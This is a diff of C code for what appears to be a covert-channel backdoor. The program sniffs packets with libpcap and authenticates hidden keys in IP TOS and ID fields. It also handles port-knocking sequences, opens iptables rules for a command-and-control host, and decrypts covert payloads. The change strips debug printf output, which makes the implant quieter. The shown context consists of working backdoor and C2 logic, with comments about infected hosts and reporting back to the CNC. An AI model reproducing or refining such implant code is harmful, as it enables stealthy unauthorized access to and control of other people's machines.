@@ -42,7 +42,6 @@ void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pa
     u_int16_t type = ntohs(ethernet->ether_type);
     struct filter* Filter = NULL;
     Filter = (struct filter *)args;
-    printf("TCP\n");
     if(type == ETHERTYPE_IP){
         ParseIP(Filter, pkthdr, packet);
     }
@@ -83,11 +82,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
 
     if(ip->ip_p == IPPROTO_UDP){
         printf("Protocal: UDP\n");
-        printf("IPID: %c\n", ip->ip_id);
-        printf("TOS: %c\n", ip->ip_tos);
-        printf("TTL: %c\n", ip->ip_ttl);
-        printf("Infected: %d\n", Filter->infected);
-
         if(CheckKey(ip->ip_tos, ip->ip_id, true)){
             //only CNC will get into this loop
             //port knocking packet
@@ -125,7 +119,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
                 iptables(Filter->targetip, false, PORT, false, false);
                 printf("COMMAND RECEIEVED \n");
                 //sending the results back to the CNC
-                printf("PORT KNOCKING\n");
                 unsigned char *buf = 0;
                 PortKnocking(Filter, pkthdr, packet, true, false);
                 //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[0], Filter->port_short[0], buf, 2);
@@ -173,10 +166,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
         exit(1);
     } else if(ip->ip_p == IPPROTO_TCP){
         printf("Protocal: TCP\n");
-        printf("IPID: %hu\n", ip->ip_id);
-        printf("TOS: %u\n", ip->ip_tos);
         if(CheckKey(ip->ip_tos, ip->ip_id, false)){
-            printf("Reading payload\n");
             ParseTCP(Filter, pkthdr, packet);
         } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
             //change to port knocking
@@ -227,8 +217,6 @@ void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_c
         perror("TCP: Control packet length is incorrect");
         exit(1);
     }
-    printf("Source port: %d\n", ntohs(tcp->th_sport));
-    printf("Destination port: %d\n", ntohs(tcp->th_dport));
     payload = (u_char *)(packet + 14 + size_ip + size_tcp);
 
     size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
@@ -282,8 +270,6 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
     cipherlen = strlen((char*)payload);
     decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
 
-    printf("Decrypted payload size: %d\n", decryptedlen);
-    printf("Decrypted Payload is: %s \n", decryptedtext);
     if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
         perror("fwrite");
         exit(1);
@@ -383,23 +369,15 @@ void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const
                 exit(1);
             }
 
-            printf("Source port: %d\n", ntohs(tcp->th_sport));
-            printf("Destination port: %d\n", ntohs(tcp->th_dport));
             payload = (u_char *)(packet + 14 + size_ip + size_tcp);
 
             size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 
-            printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
             for(int k = 0; k < Filter->amount; k++){
                 if(Filter->port_short[k] == ntohs(tcp->th_dport)){
-                printf("Filter.port_short = %hu compare and tcp->th_dport =%hu\n", ntohs(Filter->port_short[k]), tcp->th_dport);
                 Filter->pattern[k] = 1;
-                printf("Filterpattern[%d]= %d\n", k,Filter->pattern[k]);
                 }
             }
-            printf("\n");
-            printf("Filterpattern[0]= %d", Filter->pattern[0]);
-            printf("Filterpattern[1]= %d", Filter->pattern[1]);
             if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
                 iptables(Filter->targetip, true, PORT, true, false);
                 char *dip = Filter->targetip;
@@ -413,16 +391,11 @@ void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const
             const struct sniff_udp *udpheader;
             udpheader = (struct sniff_udp*)(packet + 14 + (IP_HL(ip)*4));
 
-            printf("Src port: %d\n", ntohs(udpheader->uh_sport));
-            printf("Dst port: %d\n", ntohs(udpheader->uh_dport));
             for(int k = 0; k < Filter->amount; k++){
                 if(Filter->port_short[k] == ntohs(udpheader->uh_sport)){
-                    printf("PORT KNOCKING ON %c", ntohs(udpheader->uh_dport));
                     Filter->pattern[k] = 1;
                 }
             }
-            printf("Filter->pattern[0]: %d\n", Filter->pattern[0]);
-            printf("Filter->pattern[1]: %d\n", Filter->pattern[1]);
             if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
                 iptables(Filter->targetip, false, PORT, true, false);
                 printf("WAITING FOR DATA\n");
